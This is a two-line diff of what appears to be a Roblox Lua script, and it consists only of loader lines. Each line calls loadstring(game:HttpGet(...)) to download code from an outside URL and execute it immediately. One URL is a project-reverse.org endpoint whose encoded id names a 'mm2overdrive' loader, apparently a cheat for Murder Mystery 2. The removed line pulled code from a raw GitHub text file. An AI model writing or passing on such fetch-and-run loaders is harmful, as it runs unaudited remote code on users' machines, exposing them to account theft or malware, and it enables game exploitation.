@@ -1,2 +1,1 @@
 loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjZjOWQxZmM2LTkxODktNDBjMS04ZGZiLTc3ZTdjZWVlMDYzZCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJvdmVyZHJpdmUifX0"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/pruzgar242-rgb/Update/refs/heads/main/out.lua%20(17).txt"))()
